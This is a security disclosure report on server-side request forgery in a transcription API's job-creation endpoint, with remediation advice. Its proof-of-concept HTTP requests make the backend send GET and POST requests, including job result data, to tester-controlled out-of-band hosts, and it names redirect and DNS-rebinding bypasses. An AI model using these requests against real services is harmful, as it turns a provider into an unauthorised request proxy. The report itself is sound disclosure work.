# Server-Side Request Forgery (SSRF) — `audio_url` and `callback_config.url`

## Summary

The Gladia pre-recorded transcription API performs server-side HTTP requests to URLs supplied by an
authenticated client, and those requests reach arbitrary attacker-controlled external hosts. Two request
parameters were independently confirmed to trigger an outbound request from Gladia's backend
infrastructure to a tester-controlled out-of-band (OOB) canary:

- `audio_url` — the backend issues a server-side **GET** to the supplied URL.
- `callback_config.url` — on job completion the backend issues a server-side **POST** (containing the
  job result JSON) to the supplied URL.

Both interactions were observed on two independent tester-controlled OOB services (webhook.site and Burp
Collaborator), originating from OVH-hosted IP addresses consistent with Gladia's EU infrastructure.

Scope note on impact: direct requests to loopback, link-local (`169.254.169.254`), and RFC1918 targets
were rejected quickly in earlier testing (pre-connection filtering), so internal/metadata access was
**not** achieved and is **not** claimed here. This report documents confirmed SSRF to arbitrary external
destinations.

## Severity

Medium.

Estimated CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` ≈ 5.4. Rationale: any authenticated Gladia
customer can coerce the backend into sending GET/POST requests to arbitrary external hosts; internal
resource access was not demonstrated (obvious internal ranges appear filtered). Final rating is the
program's to set.

## Affected Asset

- URL: `https://api.gladia.io/v2/pre-recorded`
- Endpoint: `POST /v2/pre-recorded` (job creation)
- Parameters (two attack surfaces of the same SSRF class):
  - `audio_url` (string) → server-side GET
  - `callback_config.url` (string, with `callback: true`) → server-side POST on completion
- HTTP Method: POST (to create the job); the SSRF request itself is GET (audio_url) / POST (callback)
- Functionality: URL-based audio ingestion, and job-completion webhook callback

## Vulnerability Description

Gladia supports transcribing audio from a URL and notifying a caller-supplied callback URL when a job
finishes. In both cases the backend performs the outbound HTTP request itself. Testing confirmed the
backend will connect to arbitrary attacker-chosen **external** hosts with no allowlist restricting the
destination, no authentication of the requester's ownership of the target, and (for callbacks) no request
signature. This is Server-Side Request Forgery: the request originates from Gladia's trusted network
position rather than the attacker's, and the destination is fully attacker-controlled.

Observed facts vs. assumptions:
- Observed: server-side GET to the tester `audio_url` canary (two OOB services, multiple OVH source IPs).
- Observed: server-side POST to the tester `callback_config.url` canary carrying the job result JSON,
  `Content-Type: application/json`, `User-Agent: axios/1.18.1`, and **no signature/authentication header**.
- Observed (earlier, timing/encoding/DNS tests): loopback/link-local/RFC1918 and metadata hostnames are
  rejected quickly (pre-connection filtering) — internal access not achieved.
- Not established from available evidence: whether the fetcher follows HTTP redirects to a new host
  without re-validating the destination (a common filter-bypass path to internal resources). Not tested,
  per assessment scope (no redirect toward internal/metadata).

## Preconditions

- A valid Gladia API key (any authenticated customer account).

## Steps to Reproduce

### Surface 1 — `audio_url`
1. Authenticate with a valid Gladia API key.
2. Send `POST /v2/pre-recorded` with `{"audio_url": "https://<TESTER-OOB>/audio-url-test"}`.
3. Observe a server-side **GET** to `<TESTER-OOB>/audio-url-test` in the OOB service.

### Surface 2 — `callback_config.url`
1. Authenticate with a valid Gladia API key.
2. Upload a small valid audio file via `POST /v2/upload` to obtain a working `audio_url`.
3. Send `POST /v2/pre-recorded` with:
   `{"audio_url": "<uploaded>", "callback": true, "callback_config": {"url": "https://<TESTER-OOB>/callback-test", "method": "POST"}}`.
4. Wait for the job to reach `done`.
5. Observe a server-side **POST** to `<TESTER-OOB>/callback-test` in the OOB service, carrying the result JSON.

## Proof of Concept

API key redacted. OOB URLs are tester-controlled. Job/file IDs belong to the tester's own account.

Surface 1 request:

```http
POST /v2/pre-recorded HTTP/2
Host: api.gladia.io
x-gladia-key: sk_gladia_REDACTED
Content-Type: application/json

{"audio_url":"https://webhook.site/<TESTER-UUID>/audio-url-test"}
```

Surface 2 request:

```http
POST /v2/pre-recorded HTTP/2
Host: api.gladia.io
x-gladia-key: sk_gladia_REDACTED
Content-Type: application/json

{"audio_url":"https://api.gladia.io/file/c91843be-f22b-4229-bde9-a6b716fdaa46",
 "callback":true,
 "callback_config":{"url":"https://webhook.site/<TESTER-UUID>/callback-test","method":"POST"}}
```

Surface 2 response:

```http
HTTP/2 201
{"id":"d77b9fd7-089b-4490-b558-d62005e8af57","result_url":"https://api.gladia.io/v2/pre-recorded/d77b9fd7-089b-4490-b558-d62005e8af57"}
```

## OOB Evidence

Surface 1 — `audio_url` (GET):
- Interaction received: **Yes** (two independent OOB services)
- HTTP method: GET
- webhook.site: `2026-09-16 16:44:01 UTC`, path `/audio-url-test`, source IP `51.91.142.116` (OVH, FR), User-Agent: none
- Burp Collaborator: `2026-09-16 16:43:58–16:44:00 UTC`, HTTP GET `/audio-url-test`, source IPs `51.178.58.138` and `91.134.55.10` (OVH, FR), preceded by DNS A-record lookups of the canary hostname
- Relevant headers (Collaborator, decoded): `GET /audio-url-test HTTP/1.1` / `accept: */*` / `host: <canary>.oastify.com`
- Source information: OVH-hosted IPs (France), consistent with Gladia's EU infrastructure and the same
  provider/region as the confirmed storage host `s3.gra.perf.cloud.ovh.net`

Surface 2 — `callback_config.url` (POST):
- Interaction received: **Yes** (webhook.site)
- HTTP method: POST
- Timestamp: `2026-09-16 16:45:22 UTC`, path `/callback-test`
- Source IP: `5.196.147.101` (OVH, FR)
- User-Agent: `axios/1.18.1`
- Content-Type: `application/json`; Content-Length: 275
- Authentication/signature headers present: **No** (no `x-gladia-signature`, HMAC, or bearer token)
- Body (tester's own job result):
  `{"id":"d77b9fd7-...","event":"transcription.success","payload":{"metadata":{...},"transcription":{"full_transcript":""}}}`

## Expected Behavior

Server-side fetches (audio ingestion and callbacks) should be constrained to prevent the backend from
being used as a request proxy: destinations validated against policy, internal ranges blocked at every
hop including redirects, and callbacks authenticated with a verifiable signature.

## Actual Behavior

The backend issues server-side GET (`audio_url`) and POST (`callback_config.url`) requests to arbitrary
attacker-controlled external hosts, and the callback carries application-generated result data with no
signature.

## Security Impact

Demonstrated: an authenticated attacker can coerce Gladia's backend into sending arbitrary GET requests
(via `audio_url`) and POST requests carrying job data (via `callback_config.url`) to any external host of
their choosing, from Gladia's trusted network egress. This enables using Gladia as an outbound request
proxy (e.g., to interact with third-party endpoints while masking the true origin behind Gladia's IPs),
and the unsigned callback means a receiver cannot cryptographically attribute the callback to Gladia.

Not demonstrated (and not claimed): access to cloud metadata, loopback, or internal RFC1918 services —
direct attempts to those targets were filtered. Escalation to internal access would require the fetcher
to follow redirects to internal hosts without re-validation, which was not tested under this assessment's
rules.

## Attack Scenario

An authenticated customer submits `audio_url`/`callback_config.url` values pointing at an external system
they wish to reach indirectly. Gladia's backend performs the request from its OVH egress IPs, so the
target sees the traffic as originating from Gladia rather than the attacker. Because callbacks are
unsigned, an attacker who can influence a victim integration's callback endpoint configuration could also
deliver forged-looking `transcription.success` payloads that the victim cannot distinguish from genuine
Gladia callbacks.

## Root Cause

Server-side URL retrieval without a destination allowlist. Internal-range filtering exists for directly
supplied hosts, but arbitrary external destinations are permitted, and callback requests are dispatched
without a signing mechanism. If redirect destinations are not re-validated, the existing internal filter
could be bypassed (unverified).

## Remediation

- Restrict outbound requests to an explicit allowlist of trusted destinations where feasible.
- Validate URLs after canonicalization; reject non-audio schemes early.
- Re-validate every redirect destination against the same policy (block private/loopback/link-local/reserved).
- Resolve DNS safely and pin the resolved address for the connection to prevent DNS-rebinding bypasses.
- Apply network-level egress controls around the fetcher/callback workers.
- Sign callbacks (e.g., HMAC over the body with a per-account secret and a timestamp) so receivers can
  verify authenticity, and avoid sending unnecessary data to attacker-controlled callback URLs.

## Evidence

- webhook.site inbox JSON: GET `/audio-url-test` from `51.91.142.116`; POST `/callback-test` from
  `5.196.147.101` with result body and no signature header (captured 2026-09-16).
- Burp Collaborator export (`output/ping`): DNS + HTTP GET `/audio-url-test` interactions from
  `51.178.58.138`, `91.134.55.10` (2026-09-16 16:43–16:44 UTC).
- Job created for callback test: `d77b9fd7-089b-4490-b558-d62005e8af57` (tester account).
- Test scripts: `scratchpad/ssrf_oob.py`, `scratchpad/cb.py`.

## Verification Status

**Confirmed — Genuine Security Vulnerability**

## Testing Scope

Testing was performed using only the authorized tester account and tester-controlled OOB infrastructure
(webhook.site and Burp Collaborator). No third-party sensitive data was intentionally accessed or
transmitted; the only data sent to the callback canary was the tester's own job result. No internal,
metadata, or RFC1918 targets were accessed.

## Notes

- The missing callback signature is a related but distinct weakness (webhook authenticity); it is
  documented here as part of the callback attack surface and may warrant a separate report.
- Internal-range access appears filtered; the highest-impact escalation (redirect/DNS-rebinding to
  internal/metadata) remains unproven and would need explicit authorization to test safely.
- Multiple distinct OVH source IPs were observed, suggesting a pool of fetcher/callback workers.
